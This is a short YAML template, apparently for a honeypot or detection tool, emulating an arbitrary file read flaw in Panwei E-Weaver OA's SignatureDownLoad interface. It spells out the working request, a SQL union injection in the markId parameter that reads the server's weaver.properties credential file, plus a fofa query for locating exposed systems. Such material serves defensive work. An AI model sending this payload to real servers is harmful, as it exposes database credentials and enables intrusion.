id: weaver-signaturedownload-lfi
info:
  name: OA E-Weaver SignatureDownLoad - Arbitrary File Read
  author: SleepingBag945
  description: 'There is an arbitrary file reading vulnerability in the E-Weaver SignatureDownLoad
    interface of Panwei OA. An attacker can read any file on the server through the
    vulnerability.

    '
  severity: high
  reference:
  - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Weaver%20SignatureDownLoad%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    max-request: 1
    fofa-query: app="泛微-E-Weaver"
  tags: ecology,weaver,oa,lfi
traps:
- request:
    method: GET
    path: /weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27
    headers: null
    body: null
  response:
    status_code: 200
    headers: {}
    body: DriverClassesecology.password
